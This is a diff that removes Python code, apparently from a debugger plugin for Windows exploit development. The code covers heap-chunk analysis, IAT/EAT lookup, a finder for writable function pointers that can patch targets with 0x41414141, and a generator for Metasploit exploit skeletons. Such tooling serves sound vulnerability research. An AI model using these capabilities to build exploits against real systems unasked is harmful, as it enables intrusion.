-                                    for todel in tomove:
-                                        del unicodestrings[todel]
-
-                                    # get objects too
-                                    # find all unique objects
-                                    # again, just store offset
-                                    objects = {}
-                                    orderedobj = []
-                                    if __DEBUGGERAPP__ == "WinDBG":
-                                        nrlines = int(float(blocksize) / 4)
-                                        cmd2run = "dds 0x%08x L 0x%x" % ((block + headersize),nrlines)
-                                        output = dbg.nativeCommand(cmd2run)
-                                        outputlines = output.split("\n")
-                                        for line in outputlines:
-                                            if line.find("::") > -1 and line.find("vftable") > -1:
-                                                parts = line.split(" ")
-                                                objconstr = ""
-                                                if len(parts) > 3:
-                                                    objectptr = hexStrToInt(parts[0])
-                                                    cnt = 2
-                                                    objectinfo = ""
-                                                    while cnt < len(parts):
-                                                        objectinfo += parts[cnt] + " "
-                                                        cnt += 1
-                                                    parts2 = line.split("::")
-                                                    parts2name = ""
-                                                    pcnt = 0
-                                                    while pcnt < len(parts2)-1:
-                                                        parts2name = parts2name + "::" + parts2[pcnt]
-                                                        pcnt += 1
-                                                    parts3 = parts2name.split(" ")
-                                                    if len(parts3) > 3:
-                                                        objconstr = parts3[3]
-                                                    if not objectptr in objects:
-                                                        objects[objectptr-block] = [objectinfo,objconstr]
-                                                    objsize = 0
-                                                    if findvtablesize:
-                                                        if not objconstr in vtableCache:
-                                                            cmd2run = "u %s::CreateElement L 12" % objconstr
-                                                            objoutput = dbg.nativeCommand(cmd2run)
-                                                            if not "HeapAlloc" in objoutput:
-                                                                cmd2run = "x %s::operator*" % objconstr
-                                                                oplist = dbg.nativeCommand(cmd2run)
-                                                                oplines = oplist.split("\n")
-                                                                oppat = "%s::operator" % objconstr
-                                                                for opline in oplines:
-                                                                    if oppat in opline and not "del" in opline:
-                                                                        lineparts = opline.split(" ")
-                                                                        cmd2run = "uf %s" % lineparts[0]
-                                                                        objoutput = dbg.nativeCommand(cmd2run)
-                                                                        break
-                                                            if "HeapAlloc" in objoutput:
-                                                                objlines = objoutput.split("\n")
-                                                                lineindex = 0
-                                                                for objline in objlines:
-                                                                    if "HeapAlloc" in objline:
-                                                                        if lineindex >= 3:
-                                                                            sizeline = objlines[lineindex-3]
-                                                                            if "push" in sizeline:
-                                                                                sizelineparts = sizeline.split("push")
-                                                                                if len(sizelineparts) > 1:
-                                                                                    sizevalue = sizelineparts[len(sizelineparts)-1].replace(" ","").replace("h","")
-                                                                                    try:
-                                                                                        objsize = hexStrToInt(sizevalue)
-                                                                                        # adjust allocation granulariy
-                                                                                        remainsize = objsize - ((objsize / 8) * 8)
-                                                                                        while remainsize != 0:
-                                                                                            objsize += 1
-                                                                                            remainsize = objsize - ((objsize / 8) * 8)
-                                                                                    except:
-                                                                                        #print traceback.format_exc()
-                                                                                        objsize = 0
-                                                                                break
-                                                                    lineindex += 1
-                                                            vtableCache[objconstr] = objsize
-                                                        else:
-                                                            objsize = vtableCache[objconstr]
-
-                                    # remove object entries that belong to the same object
-                                    allobjects = []
-                                    objectstodelete = []
-                                    for optr in objects:
-                                        allobjects.append(optr)
-                                    allobjects.sort()
-                                    skipuntil = 0
-                                    for optr in allobjects:
-                                        if optr < skipuntil:
-                                            objectstodelete.append(optr)
-                                        else:
-                                            objname = objects[optr][1]
-                                            objsize = 0
-                                            try:
-                                                objsize = vtableCache[objname]
-                                            except:
-                                                objsize = 0
-                                            skipuntil = optr + objsize
-                                    # remove vtable lines that are too close to each other
-                                    minvtabledistance = 0x0c
-                                    prevvname = ""
-                                    prevptr = 0
-                                    thisvname = ""
-                                    for optr in allobjects:
-                                        thisvname = objects[optr][1]
-                                        if thisvname == prevvname and (optr - prevptr) <= minvtabledistance:
-                                            if not optr in objectstodelete:
-                                                objectstodelete.append(optr)
-                                        else:
-                                            prevptr = optr
-                                            prevvname = thisvname
-
-
-                                    for vtableptr in objectstodelete:
-                                        del objects[vtableptr]
-
-                                    for obj in objects:
-                                        orderedobj.append(obj)
-
-                                    for ascstring in asciistrings:
-                                        orderedobj.append(ascstring)
-
-                                    for unicodestring in unicodestrings:
-                                        orderedobj.append(unicodestring)
-
-                                    for bstrobj in bstr:
-                                        orderedobj.append(bstrobj)
-
-                                    orderedobj.sort()
-
-                                    # print out details for this chunk
-                                    chunkprefix = ""
-                                    fieldname1 = "Usersize"
-                                    fieldname2 = "ChunkSize"
-                                    if infotype == "virtualallocdblocks":
-                                        chunkprefix = "VA "
-                                        fieldname1 = "CommitSize"
-                                    tolog = "%sChunk 0x%08x (%s 0x%x, %s 0x%x) : %s" % (chunkprefix,block,fieldname1,usersize,fieldname2,usersize+unused,flags)
-                                    if showdata:
-                                        dbg.log(tolog)
-                                    logfile_l.write(tolog,thislog_l)
-
-                                    previousptr = block
-                                    previoussize = 0
-                                    showinlog = False
-                                    for ptr in orderedobj:
-                                        ptrtype = ""
-                                        ptrinfo = ""
-                                        data = ""
-                                        alldata = ""
-                                        blockinfo = ""
-                                        ptrbytes = 0
-                                        endptr = 0
-                                        datasize = 0
-                                        ptrchars = 0
-                                        infoptr = block + ptr
-                                        endptr = 0
-                                        if ptr in asciistrings:
-                                            ptrtype = "String"
-                                            dataend = asciistrings[ptr]
-                                            data = blockmem[ptr:dataend]
-                                            alldata = data
-                                            ptrbytes = len(data)
-                                            ptrchars = ptrbytes
-                                            datasize = ptrbytes
-                                            if ptrchars > 100:
-                                                data = data[0:100]+"..."
-                                            blockinfo = "%s (Data : 0x%x/%d bytes, 0x%x/%d chars) : %s" % (ptrtype,ptrbytes,ptrbytes,ptrchars,ptrchars,data)
-                                            infoptr = block + ptr
-                                            endptr = infoptr + ptrchars -  1  # need -1
-                                        elif ptr in bstr:
-                                            ptrtype = "BSTR"
-                                            dataend = bstr[ptr]
-                                            data = blockmem[ptr:dataend].replace("\x00","")
-                                            alldata = data
-                                            ptrchars = len(data)
-                                            ptrbytes = ptrchars*2
-                                            datasize = ptrbytes+6
-                                            infoptr = block + ptr - 3
-                                            if ptrchars > 100:
-                                                data = data[0:100]+"..."
-                                            blockinfo = "%s 0x%x/%d bytes (Data : 0x%x/%d bytes, 0x%x/%d chars) : %s" % (ptrtype,ptrbytes+6,ptrbytes+6,ptrbytes,ptrbytes,ptrchars,ptrchars,data)
-                                            endptr = infoptr + ptrbytes + 6
-                                        elif ptr in unicodestrings:
-                                            ptrtype = "Unicode"
-                                            dataend = unicodestrings[ptr]
-                                            data = blockmem[ptr:dataend].replace("\x00","")
-                                            alldata = ""
-                                            ptrchars = len(data)
-                                            ptrbytes = ptrchars * 2
-                                            datasize = ptrbytes
-                                            if ptrchars > 100:
-                                                data = data[0:100]+"..."
-                                            blockinfo = "%s (0x%x/%d bytes, 0x%x/%d chars) : %s" % (ptrtype,ptrbytes,ptrbytes,ptrchars,ptrchars,data)
-                                            endptr = infoptr + ptrbytes + 2
-                                        elif ptr in objects:
-                                            ptrtype = "Object"
-                                            data = objects[ptr][0]
-                                            vtablename = objects[ptr][1]
-                                            datasize = 0
-                                            if vtablename in vtableCache:
-                                                datasize = vtableCache[vtablename]
-                                            alldata = data
-                                            if datasize > 0:
-                                                blockinfo = "%s (0x%x bytes): %s" % (ptrtype,datasize,data)
-                                            else:
-                                                blockinfo = "%s : %s" % (ptrtype,data)
-                                            endptr = infoptr + datasize
-
-                                        # calculate delta
-                                        slackspace = infoptr - previousptr
-                                        if endptr > 0 and not ptrtype=="Object":
-                                            if slackspace >= 0:
-                                                tolog = "  +%04x @ %08x->%08x : %s" % (slackspace,infoptr,endptr,blockinfo)
-                                            else:
-                                                tolog = "       @ %08x->%08x : %s" % (infoptr,endptr,blockinfo)
-                                        else:
-                                            if slackspace >= 0:
-                                                if endptr != infoptr:
-                                                    tolog = "  +%04x @ %08x->%08x : %s" % (slackspace,infoptr,endptr,blockinfo)
-                                                else:
-                                                    tolog = "  +%04x @ %08x           : %s" % (slackspace,infoptr,blockinfo)
-                                            else:
-                                                tolog = "        @ %08x           : %s" % (infoptr,blockinfo)
-
-                                        if filterafter == "" or (filterafter != "" and filterafter in alldata):
-                                            showinlog = True  # keep this for the entire block
-                                            if (filterafter != ""):
-                                                nr_filter_matches += 1
-                                        if showinlog:
-                                            if showdata:
-                                                dbg.log(tolog)
-                                            logfile_l.write(tolog,thislog_l)
-                                        
-                                        previousptr = endptr
-                                        previoussize = datasize
-
-                        # save vtableCache again
-                        if filterafter != "":
-                            tolog = "Nr of filter matches: %d" % nr_filter_matches
-                            if showdata:
-                                dbg.log("")
-                                dbg.log(tolog)
-                            logfile_l.write("",thislog_l)
-                            logfile_l.write(tolog,thislog_l)
-                        dbg.addKnowledge("vtableCache",vtableCache)
-
-
-                    if searchtype in ["segments","all","chunks"] or "stat" in args:
-                        segments = getSegmentsForHeap(heapbase)
-                        dbg.log("Segment List for heap 0x%08x:" % (heapbase))
-                        dbg.log("---------------------------------")
-                        sortedsegments = []
-                        for seg in segments:
-                            sortedsegments.append(seg)
-                        if not win7mode:
-                            sortedsegments.sort()
-                        vablocks = []
-                        # VirtualAllocdBlocks
-                        vachunks = mHeap.getVirtualAllocdBlocks()
-                        infoblocks = {}
-                        infoblocks["segments"] = sortedsegments
-                        if searchtype in ["all","chunks"]:
-                            infoblocks["virtualallocdblocks"] = [vachunks]
-
-                        for infotype in infoblocks:
-                            heapdata = infoblocks[infotype]
-                            for thisdata in heapdata:
-                                tolog = ""
-                                if infotype == "segments":
-                                    # 0 : segmentstart
-                                    # 1 : segmentend
-                                    # 2 : firstentry
-                                    # 3 : lastentry
-                                    seg = thisdata
-                                    segstart = segments[seg][0]
-                                    segend = segments[seg][1]
-                                    segsize = segend-segstart
-                                    FirstEntry = segments[seg][2]
-                                    LastValidEntry = segments[seg][3]
-                                    tolog = "Segment 0x%08x - 0x%08x (FirstEntry: 0x%08x - LastValidEntry: 0x%08x): 0x%08x bytes" % (segstart,segend,FirstEntry,LastValidEntry, segsize)
-                                if infotype == "virtualallocdblocks":
-                                    vablocks = heapdata
-                                    tolog = "Heap : 0x%08x%s : VirtualAllocdBlocks : %d " % (heapbase,heapbase_extra,len(vachunks))
-                                #dbg.log("")
-                                dbg.log(tolog)
-                                if searchtype == "chunks" or "stat" in args:
-                                    try:
-                                        logfile_b.write("Heap: 0x%08x%s" % (heapbase,heapbase_extra),thislog_b)
-                                        #logfile_b.write("",thislog_b)
-                                        logfile_b.write(tolog,thislog_b)
-                                    except:
-                                        pass
-                                    if infotype == "segments":
-                                        datablocks = walkSegment(FirstEntry,LastValidEntry,heapbase)
-                                    else:
-                                        datablocks = heapdata[0]
-                                    tolog = "    Nr of chunks : %d " % len(datablocks)
-                                    dbg.log(tolog)
-                                    try:
-                                        logfile_b.write(tolog,thislog_b)
-                                    except:
-
-                                        pass
-                                    if len(datablocks) > 0:
-                                        tolog = "    _HEAP_ENTRY  psize   size  unused  UserPtr   UserSize"
-                                        dbg.log(tolog)
-                                        try:
-                                            logfile_b.write(tolog,thislog_b)
-                                        except:
-                                            pass
-                                        sortedblocks = []
-                                        for block in datablocks:
-                                            sortedblocks.append(block)
-                                        sortedblocks.sort()
-                                        nextblock = 0
-                                        segstatinfo = {}
-                                        for block in sortedblocks:
-                                            showinlog = False
-                                            thischunk = datablocks[block]
-                                            unused = thischunk.unused
-                                            headersize = thischunk.headersize
-                                            flagtxt = getHeapFlag(thischunk.flag)
-                                            if not infotype == "virtualallocdblocks" and "virtallocd" in flagtxt.lower():
-                                                flagtxt += " (LFH)"
-                                                flagtxt = flagtxt.replace("Virtallocd","Internal")
-                                            userptr = block + headersize
-                                            psize = thischunk.prevsize * 8
-                                            blocksize = thischunk.size * 8
-                                            selfsize = blocksize
-                                            usersize = selfsize - unused                
-                                            usersize = blocksize - unused
-                                            extratxt = ""   
-                                            if infotype == "virtualallocdblocks":
-                                                nextblock = thischunk.flink
-                                                extratxt = " (0x%x bytes committed)" % (thischunk.commitsize * 8)
-                                            else:
-                                                nextblock = block + blocksize
-
-                                            if not "stat" in args:
-                                                tolog = "       %08x  %05x  %05x   %05x  %08x  %08x (%d) (%s) %s" % (block,psize,selfsize,unused,block+headersize,usersize,usersize,flagtxt,extratxt)
-                                                dbg.log(tolog)
-                                                logfile_b.write(tolog,thislog_b)
-                                            else:
-                                                if not usersize in segstatinfo:
-                                                    segstatinfo[usersize] = 1
-                                                else: 
-                                                    segstatinfo[usersize] += 1
-                                        
-                                        if nextblock > 0 and nextblock < LastValidEntry:
-                                            if not "stat" in args:
-                                                nextblock -= headersize
-                                                restbytes = LastValidEntry - nextblock
-                                                tolog = "       0x%08x - 0x%08x (end of segment) : 0x%x (%d) uncommitted bytes" % (nextblock,LastValidEntry,restbytes,restbytes)
-                                                dbg.log(tolog)
-                                                logfile_b.write(tolog,thislog_b)
-                                        if "stat" in args:
-                                            statinfo[segstart] = segstatinfo
-                                            # show statistics
-                                            orderedsizes = []
-                                            totalalloc = 0
-                                            for thissize in segstatinfo:
-                                                orderedsizes.append(thissize)
-                                                totalalloc += segstatinfo[thissize] 
-                                            orderedsizes.sort(reverse=True)
-                                            tolog = "    Segment Statistics:"
-                                            dbg.log(tolog)
-                                            try:
-                                                logfile_b.write(tolog,thislog_b)
-                                            except:
-                                                pass
-                                            for thissize in orderedsizes:
-                                                nrblocks = segstatinfo[thissize]
-                                                percentage = (float(nrblocks) / float(totalalloc)) * 100
-                                                tolog = "    Size : 0x%x (%d) : %d chunks (%.2f %%)" % (thissize,thissize,nrblocks,percentage)
-
-                                                dbg.log(tolog)
-                                                try:
-                                                    logfile_b.write(tolog,thislog_b)
-                                                except:
-                                                    pass
-                                            tolog = "    Total chunks : %d" % totalalloc
-                                            dbg.log(tolog)
-                                            try:
-                                                logfile_b.write(tolog,thislog_b)
-                                            except:
-                                                pass
-                                            tolog = ""
-                                            try:
-                                                logfile_b.write(tolog,thislog_b)
-                                            except:
-                                                pass
-                                            dbg.log("")
-                                        dbg.log("")
-
-
-                if "stat" in args and len(statinfo) > 0:
-                    tolog = "Global statistics"
-                    dbg.log(tolog)
-                    try:
-                        logfile_b.write(tolog,thislog_b)
-                    except:
-                        pass
-                    globalstats = {}
-                    allalloc = 0
-                    for seginfo in statinfo:
-                        segmentstats = statinfo[seginfo]
-                        for size in segmentstats:
-                            allalloc += segmentstats[size]
-                            if not size in globalstats:
-                                globalstats[size] = segmentstats[size]
-                            else:
-                                globalstats[size] += segmentstats[size]
-                    orderedstats = []
-                    for size in globalstats:
-                        orderedstats.append(size)
-                    orderedstats.sort(reverse=True)
-                    for thissize in orderedstats:
-                        nrblocks = globalstats[thissize]
-                        percentage = (float(nrblocks) / float(allalloc)) * 100
-                        tolog = "  Size : 0x%x (%d) : %d chunks (%.2f %%)" % (thissize,thissize,nrblocks,percentage)
-                        dbg.log(tolog)
-                        try:
-                            logfile_b.write(tolog,thislog_b)
-                        except:
-                            pass
-                    tolog = "  Total chunks : %d" % allalloc
-                    dbg.log(tolog)
-                    try:
-                        logfile_b.write(tolog,thislog_b)
-                    except:
-                        pass
-            #dbg.log("%s" % "*" * 90)                   
-                    
-            return
-        
-        def procGetIAT(args):
-            return procGetxAT(args,"iat")
-
-        def procGetEAT(args):
-            return procGetxAT(args,"eat")
-
-        def procFwptr(args):
-            modulecriteria = {}
-            criteria = {}           
-            modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
-            modulestosearch = getModulesToQuery(modulecriteria)
-            allpages = dbg.getMemoryPages()
-            orderedpages = []
-            for page in allpages.keys():
-                orderedpages.append(page)
-            orderedpages.sort()
-            pagestoquery = {}
-            fwptrs = {}
-
-            objwptr = MnLog("wptr.txt")
-            wptrfile = objwptr.reset()
-
-            setbps = False
-            dopatch = False
-            dofreelist = False
-
-            if "bp" in args:
-                setbps = True
-
-            if "patch" in args:
-                dopatch = True
-
-            if "freelist" in args:
-                dofreelist = True
-
-            chunksize = 0
-            offset = 0
-
-            if "chunksize" in args:
-                if type(args["chunksize"]).__name__.lower() != "bool":
-                    try:
-                        if str(args["chunksize"]).lower().startswith("0x"):
-                            chunksize = int(args["chunksize"],16)
-                        else:
-                            chunksize = int(args["chunksize"])
-                    except:
-                        chunksize = 0
-                if chunksize == 0 or chunksize > 0xffff:
-                    dbg.log("[!] Invalid chunksize specified")
-                    if chunksize > 0xffff:
-                        dbg.log("[!] Chunksize must be <= 0xffff")
-                        chunksize == 0
-                        return
-                else:
-                    dbg.log("[+] Will filter on chunksize 0x%0x" % chunksize )
-            if dofreelist:
-                if "offset" in args:
-                    if type(args["offset"]).__name__.lower() != "bool":
-                        try:
-                            if str(args["offset"]).lower().startswith("0x"):
-                                offset = int(args["offset"],16)
-                            else:
-                                offset = int(args["offset"])
-                        except:
-                            offset = 0
-                    if offset == 0:
-                        dbg.log("[!] Invalid offset specified")
-                    else:
-                        dbg.log("[+] Will add 0x%0x bytes between flink/blink and fwptr" % offset )         
-
-            if not silent:
-                if setbps:
-                    dbg.log("[+] Will set breakpoints on found CALL/JMP")
-                if dopatch:
-                    dbg.log("[+] Will patch target for CALL/JMP with 0x41414141")
-                dbg.log("[+] Extracting .text/.code sections from %d modules" % len(modulestosearch))
-                dbg.updateLog()
-
-            if len(modulestosearch) > 0:        
-                for thismodule in modulestosearch:
-                    # find text section
-                    for thispage in orderedpages:
-                        page = allpages[thispage]
-                        pagestart = page.getBaseAddress()
-                        pagesize = page.getSize()
-                        ptr = MnPointer(pagestart)
-                        mod = ""
-                        sectionname = ""
-                        try:
-                            mod = ptr.belongsTo()
-                            if mod == thismodule:
-                                sectionname = page.getSection()
-                                if sectionname == ".text" or sectionname == ".code":    
-                                    pagestoquery[mod] = [pagestart,pagestart+pagesize]
-                                    break
-                        except:
-                            pass
-            if len(pagestoquery) > 0:
-                if not silent:
-                    dbg.log("[+] Analysing .text/.code sections")
-                    dbg.updateLog()
-                for modname in pagestoquery:
-                    tmodcnt = 0
-                    nr_sizematch = 0
-                    pagestart = pagestoquery[modname][0]
-                    pageend = pagestoquery[modname][1]
-                    if not silent:
-                        dbg.log("    - Carving through %s (0x%08x - 0x%08x)" % (modname,pagestart,pageend))
-                        dbg.updateLog()
-                    loc = pagestart
-                    while loc < pageend:
-                        try:
-                            thisinstr = dbg.disasm(loc)
-                            instrbytes = thisinstr.getDump()
-                            if thisinstr.isJmp() or thisinstr.isCall():
-                                # check if it's reading a pointer from somewhere
-                                instrtext = getDisasmInstruction(thisinstr)
-                                opcodepart = instrbytes.upper()[0:4]
-                                if opcodepart == "FF15" or opcodepart == "FF25":
-                                    if "[" in instrtext and "]" in instrtext:
-                                        parts1 = instrtext.split("[")
-                                        if len(parts1) > 1:
-                                            parts2 = parts1[1].split("]")
-                                            addy = parts2[0]
-                                            # get the actual value and check if it's writeable
-                                            if "(" in addy and ")" in addy:
-                                                parts1 = addy.split("(")
-                                                parts2 = parts1[1].split(")")
-                                                addy = parts2[0]
-                                            if isHexValue(addy):
-                                                addyval = hexStrToInt(addy)
-                                                access = getPointerAccess(addyval)
-                                                if "WRITE" in access:
-                                                    if meetsCriteria(addyval,criteria):
-                                                        savetolog = False
-                                                        sizeinfo = ""
-                                                        if chunksize == 0:
-                                                            savetolog = True
-                                                        else:
-                                                            # check if this location could acts as a heap chunk for a certain size
-                                                            # the size field would be placed at the curren location - 8 bytes
-                                                            # and is 2 bytes large
-                                                            sizeval = 0
-                                                            if not dofreelist:
-                                                                sizeval = struct.unpack('<H',dbg.readMemory(addyval-8,2))[0]
-                                                                if sizeval >= chunksize:
-                                                                    savetolog = True
-                                                                    nr_sizematch += 1
-                                                                    sizeinfo = " Chunksize: %d (0x%02x) - " % ((sizeval*8),(sizeval*8))                                                             
-                                                            else:
-                                                                sizeval = struct.unpack('<H',dbg.readMemory(addyval-8-offset,2))[0]
-                                                                #
-                                                                flink = struct.unpack('<L',dbg.readMemory(addyval-offset,4))[0]
-                                                                blink = struct.unpack('<L',dbg.readMemory(addyval+4-offset,4))[0]
-                                                                aflink = getPointerAccess(flink)
-                                                                ablink = getPointerAccess(blink)
-                                                                if "READ" in aflink and "READ" in ablink:
-                                                                    extr = ""
-                                                                    if sizeval == chunksize or sizeval == chunksize + 1:
-                                                                        extr = " **size match**"
-                                                                        nr_sizematch += 1
-                                                                    sizeinfo = " Chunksize: %d (0x%02x)%s, UserPtr 0x%08x, Flink 0x%08x, Blink 0x%08x - " % ((sizeval*8),(sizeval*8),extr,addyval-offset,flink,blink)
-                                                                    savetolog = True
-                                                        if savetolog:
-                                                            fwptrs[loc] = addyval
-                                                            tmodcnt += 1
-                                                            ptrx = MnPointer(addyval)
-                                                            mod = ptrx.belongsTo()
-
-                                                            tofile = "0x%08x : 0x%08x gets called from %s at 0x%08x (%s) - %s%s" % (addyval,addyval,mod,loc,instrtext,sizeinfo,ptrx.__str__())
-                                                            objwptr.write(tofile,wptrfile)
-                                                            if setbps:
-                                                                dbg.setBreakpoint(loc)
-                                                            if dopatch:
-                                                                dbg.writeLong(addyval,0x41414141)
-                            if len(instrbytes) > 0:
-                                loc = loc + len(instrbytes)/2
-                            else:
-                                loc = loc + 1
-                        except:
-                            loc = loc + 1
-                    if not silent:
-                        dbg.log("      Found %d pointers" % tmodcnt)
-                        if chunksize > 0:
-                            dbg.log("      %d pointers with size match" % nr_sizematch)                             
-
-            return
-
-        def procGetxAT(args,mode):
-        
-            keywords = []
-            keywordstring = ""
-            modulecriteria = {}
-            criteria = {}
-
-            thisxat = {}
-
-            entriesfound = 0
-            
-            if "s" in args:
-                if type(args["s"]).__name__.lower() != "bool":
-                    keywordstring = args["s"].replace("'","").replace('"','')
-                    keywords = keywordstring.split(",")
-            
-            modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
-            
-            modulestosearch = getModulesToQuery(modulecriteria)
-            if not silent:
-                dbg.log("[+] Querying %d modules" % len(modulestosearch))
-            
-            if len(modulestosearch) > 0:
-            
-                xatfilename="%ssearch.txt" % mode
-                objxatfilename = MnLog(xatfilename)
-                xatfile = objxatfilename.reset()
-            
-                for thismodule in modulestosearch:
-                    thismod = MnModule(thismodule) 
-                    if mode == "iat":
-                        thisxat = thismod.getIAT()
-                    else:
-                        thisxat = thismod.getEAT()
-
-                    thismodule = thismod.getShortName()
-
-                    for thisfunc in thisxat:
-                        thisfuncname = thisxat[thisfunc].lower()
-                        origfuncname = thisfuncname
-                        firstindex = thisfuncname.find(".")
-                        if firstindex > 0:
-                            thisfuncname = thisfuncname[firstindex+1:len(thisfuncname)]
-                        addtolist = False
-                        iatptr_modname = ""
-                        modinfohr = ""
-                        theptr = 0
-                        if mode == "iat":
-                            theptr = struct.unpack('<L',dbg.readMemory(thisfunc,4))[0]
-                            ptrx = MnPointer(theptr)
-                            iatptr_modname = ptrx.belongsTo()
-                            if not iatptr_modname == "" and "." in iatptr_modname:
-                                iatptr_modparts = iatptr_modname.split(".")
-                                iatptr_modname = iatptr_modparts[0]
-                            if not "." in origfuncname and iatptr_modname != "" and not "!" in origfuncname:
-                                origfuncname = iatptr_modname.lower() + "." + origfuncname
-                                thisfuncname = origfuncname
-                                
-                            if "!" in origfuncname:
-                                oparts = origfuncname.split("!")
-                                origfuncname = iatptr_modname + "." + oparts[1]
-                                thisfuncname = origfuncname
-
-                            try:
-                                ModObj = MnModule(iatptr_modname)
-                                modinfohr = " - %s" % (ModObj.__str__())
-                            except:
-                                modinfohr = ""
-                                pass
-
-                        if len(keywords) > 0:
-                            for keyword in keywords:
-                                keyword = keyword.lower().strip()
-                                if ((keyword.startswith("*") and keyword.endswith("*")) or keyword.find("*") < 0):
-                                    keyword = keyword.replace("*","")
-                                    if thisfuncname.find(keyword) > -1:
-                                        addtolist = True
-                                        break
-                                if keyword.startswith("*") and not keyword.endswith("*"):
-                                    keyword = keyword.replace("*","")
-                                    if thisfuncname.endswith(keyword):
-                                        addtolist = True
-                                        break
-                                if keyword.endswith("*") and not keyword.startswith("*"):
-                                    keyword = keyword.replace("*","")
-                                    if thisfuncname.startswith(keyword):
-                                        addtolist = True
-                                        break
-                        else:
-                            addtolist = True
-                        if addtolist:
-                            entriesfound += 1
-                            # add info about the module
-
-                            if mode == "iat":
-                                thedelta = thisfunc - thismod.moduleBase
-                                logentry = "At 0x%s in %s (base + 0x%s) : 0x%s (ptr to %s) %s" % (toHex(thisfunc),thismodule.lower(),toHex(thedelta),toHex(theptr),origfuncname,modinfohr)
-                            else:
-                                thedelta = thisfunc - thismod.moduleBase
-                                logentry = "0x%08x : %s!%s (0x%08x+0x%08x)" % (thisfunc,thismodule.lower(),origfuncname,thismod.moduleBase,thedelta)
-                            dbg.log(logentry,address = thisfunc)
-                            objxatfilename.write(logentry,xatfile)
-                if not silent:
-                    dbg.log("")
-                    dbg.log("%d entries found" % entriesfound)
-            return
-
-            
-        #-----Metasploit module skeleton-----#
-        def procSkeleton(args):
-        
-            cyclicsize = 5000
-            if "c" in args:
-                if type(args["c"]).__name__.lower() != "bool":
-                    try:
-                        cyclicsize = int(args["c"])
-                    except:
-                        cyclicsize = 5000
-
-            exploittype = ""
-            skeletonarg = ""
-            usecliargs = False
-            validstypes ={}
-            validstypes["tcpclient"] = "network client (tcp)"
-            validstypes["udpclient"] = "network client (udp)"
-            validstypes["fileformat"] = "fileformat"
-            exploittypes = [ "fileformat","network client (tcp)","network client (udp)" ]
-            errorfound = False
-            if __DEBUGGERAPP__ == "WinDBG" or __DEBUGGERAPP__ == 'x64dbg' or "t" in args:
-                if "t" in args:
-                    if type(args["t"]).__name__.lower() != "bool":
-                        skeltype = args["t"].lower()
-                        skelparts = skeltype.split(":")
-                        if skelparts[0] in validstypes:
-                            exploittype = validstypes[skelparts[0]]
-                            if len(skelparts) > 1:
-                                skeletonarg = skelparts[1]
-                            else:
-                                errorfound = True
-                            usecliargs = True
-                        else:
-                            errorfound = True
-                    else:
-                        errorfound = True
-                else:
-                    errorfound = True
-            # ask for type of module
-            else:
-                dbg.log(" ** Please select a skeleton exploit type from the dropdown list **",highlight=1)
-                exploittype = dbg.comboBox("Select msf exploit skeleton to build :", exploittypes).lower().strip()
-
-            if errorfound:
-                dbg.log(" ** Please specify a valid skeleton type and argument **",highlight=1)
-                dbg.log("    Valid types are : tcpclient:argument, udpclient:argument, fileformat:argument")
-                dbg.log("    Example : skeleton for a pdf file format exploit: -t fileformat:pdf")
-                dbg.log("              skeleton for tcp client against port 123: -t tcpclient:123")
-                return
-            if not exploittype in exploittypes:
-                dbg.log("Boo - invalid exploit type, try again !",highlight=1)
-                return
-                
-            portnr = 0
-            extension = ""
-            if exploittype.find("network") > -1:
-                if usecliargs:
-                    portnr = skeletonarg
-                else:
-                    portnr = dbg.inputBox("Remote port number : ")
-                try:
-                    portnr = int(portnr)
-                except:
-                    portnr = 0
-
-            if exploittype.find("fileformat") > -1:
-                if usecliargs:
-                    extension = skeletonarg
-                else:
-                    extension = dbg.inputBox("File extension :")
-            
-            extension = extension.replace("'","").replace('"',"").replace("\n","").replace("\r","")
-            
-            if not extension.startswith("."):
-                extension = "." + extension         
-            
-            exploitfilename="msfskeleton.rb"
-            objexploitfile = MnLog(exploitfilename)
-            global ignoremodules
-            global noheader
-            noheader = True
-            ignoremodules = True
-            exploitfile = objexploitfile.reset()            
-            ignoremodules = False
-            noheader = False
-
-            modulecriteria = {}
-            criteria = {}
-            
-            modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
-            
-            badchars = ""
-            if "badchars" in criteria:
-                badchars = criteria["badchars"]
-                
-            if "nonull" in criteria:
-                if not '\x00' in badchars:
-                    badchars += '\x00'          
-            
-            skeletonheader,skeletoninit,skeletoninit2 = getSkeletonHeader(exploittype,portnr,extension,"",badchars)
-            
-            targetstr = "      'Targets'    =>\n"
-            targetstr += "        [\n"
-            targetstr += "          [ '<fill in the OS/app version here>',\n"
-            targetstr += "            {\n"
-            targetstr += "              'Ret'     =>  0x00000000,\n"
-            targetstr += "              'Offset'  =>  0\n"
-            targetstr += "            }\n"
-            targetstr += "          ],\n"
-            targetstr += "        ],\n"
-            
-            exploitstr = "  def exploit\n\n"
-            if exploittype.find("network") > -1:
-                if exploittype.find("tcp") > -1:
-                    exploitstr += "\n    connect\n\n"
-                elif exploittype.find("udp") > -1:
-                    exploitstr += "\n    connect_udp\n\n"
-            
-            exploitstr += "    buffer = Rex::Text.pattern_create(" + str(cyclicsize) + ")\n"
-            
-            if exploittype.find("network") > -1:
-                exploitstr += "\n    print_status(\"Trying target #{target.name}...\")\n"   
-                if exploittype.find("tcp") > -1:
-                    exploitstr += "    sock.put(buffer)\n"
-                    exploitstr += "\n    handler\n"
-                elif exploittype.find("udp") > -1:
-                    exploitstr += "    udp_sock.put(buffer)\n"
-                    exploitstr += "\n    handler(udp_sock)\n"           
-            if exploittype == "fileformat":
-                exploitstr += "\n    file_create(buffer)\n\n"                       
-            if exploittype.find("network") > -1:
-                exploitstr += "    disconnect\n\n"                      
-                
-            exploitstr += "  end\n"             
-            
-            objexploitfile.write(skeletonheader+"\n",exploitfile)
-            objexploitfile.write(skeletoninit+"\n",exploitfile)
-            objexploitfile.write(targetstr,exploitfile)
-            objexploitfile.write(skeletoninit2,exploitfile)     
-            objexploitfile.write(exploitstr,exploitfile)
-            objexploitfile.write("end",exploitfile) 
-            
-            
-            return
-
-
-        def procFillChunk(args):
-        
-            reference = ""
-            fillchar = "A"
-            allregs = dbg.getRegs()
-            origreference = ""
-
-            deref = False
-            refreg = ""
-            offset = 0
-            signstuff = 1
-            customsize = 0
-
-            if "s" in args:
-                if type(args["s"]).__name__.lower() != "bool":
-                    sizearg = args["s"]
-                    if sizearg.lower().startswith("0x"):
-                        sizearg = sizearg.lower().replace("0x","")
-                        customsize = int(sizearg,16)
-                    else:
-                        customsize = int(sizearg)
-
-            if "r" in args:
-                if type(args["r"]).__name__.lower() != "bool":
-
-                    # break into pieces
-                    reference = args["r"].upper()
-                    origreference = reference
